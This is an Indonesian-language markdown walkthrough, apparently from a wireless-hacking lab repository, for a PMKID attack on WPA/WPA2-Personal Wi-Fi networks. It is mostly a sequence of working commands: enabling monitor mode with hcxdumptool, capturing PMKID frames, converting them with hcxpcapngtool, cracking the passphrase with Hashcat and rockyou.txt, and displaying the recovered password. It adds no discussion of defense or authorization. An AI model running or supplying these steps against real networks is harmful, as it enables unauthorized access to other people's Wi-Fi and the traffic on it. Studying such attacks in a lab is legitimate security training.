# PMKID Attack

## Persyaratan
- Jaringan Wi-Fi WPA/WPA2-Personal
- OS Linux
- Hak akses root (`sudo`)
- hcxdumptool ([6.2.8](https://github.com/ZerBea/hcxdumptool/releases/download/6.2.8/hcxdumptool-6.2.8.tar.gz))
- hcxtools ([6.2.8](https://github.com/ZerBea/hcxtools/releases/download/6.2.8/hcxtools-6.2.8.tar.gz))
- Hashcat
- Wordlist (`rockyou.txt`)
  
## Langkah-Langkah

#### 1. Lihat semua interface wireless yang aktif:

```
hcxdumptool -I
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/lihat%20interface.png)

#### 2. Aktifkan mode monitor:

```
sudo hcxdumptool -m wlan1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/aktifkan%20mode%20monitor.png)

#### 3. Capture PMKID menggunakan hcxdumptool:

```
sudo hcxdumptool -i wlan1 -o capture.pcap -s 2 --disable_client_attacks --disable_deauthentication --tot=5 --enable_status=1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hcxdumptool.png)

#### 4. Konversi hasil capture ke format Hashcat:

```
hcxpcapngtool -o hash.txt capture.pcap
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hcxpcapngtool.png)


#### 5. Lihat hasil konversi hash:

```
cat hash.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hash.png)

#### 6. Crack hash menggunakan Hashcat:

```
hashcat -a 0 -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hashcat.png)

#### 7. Lihat hasil cracking:

```
hashcat -m 22000 --show hash.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/cracked.png)

Anjay 🗿
